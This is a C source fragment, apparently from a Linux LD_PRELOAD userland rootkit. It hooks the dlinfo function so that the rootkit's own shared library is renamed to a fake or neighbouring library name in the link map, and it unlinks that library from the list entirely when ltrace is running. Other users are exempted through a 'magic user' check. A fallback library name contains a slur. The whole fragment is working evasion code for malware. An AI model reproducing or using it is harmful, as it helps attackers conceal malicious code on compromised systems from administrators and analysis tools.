static struct link_map *bdvl_linkmap;

void repair_linkmap(void){
    bdvl_linkmap->l_prev->l_next = bdvl_linkmap;
    bdvl_linkmap->l_next->l_prev = bdvl_linkmap;
}

int dlinfo(void *handle, int request, void *p){
    struct link_map *loop;
    char o;

    hook(CDLINFO);
    if(magicusr() || request != 2)
        return (long)call(CDLINFO, handle, request, p);

    if(!initmvbc()) return 0;

    call(CDLINFO, handle, request, &loop);
    do{
        loop = loop->l_next;
        if(!strcmp(loop->l_name, "\0"))
            continue;

        if(strstr(loop->l_name, mvbc->bdvlso)){
            bdvl_linkmap = loop;
            o = loop->l_prev->l_name[strlen(loop->l_prev->l_name)-1];

            if(isadigit(o)){
                loop->l_name = strdup(loop->l_prev->l_name);
                if(loop->l_name != NULL)
                    --loop->l_name[strlen(loop->l_name)-1];
                else loop->l_name = "linux-ugay.so.0";
            }else loop->l_name = xordup(FAKE_LINKMAP_NAME);

            if(process("ltrace")){
                atexit(repair_linkmap);
                loop->l_prev->l_next = loop->l_next;
                loop->l_next->l_prev = loop->l_prev;
            }
        }
    }while(loop != NULL && loop->l_next != NULL);

    return (long)call(CDLINFO, handle, request, p);
}
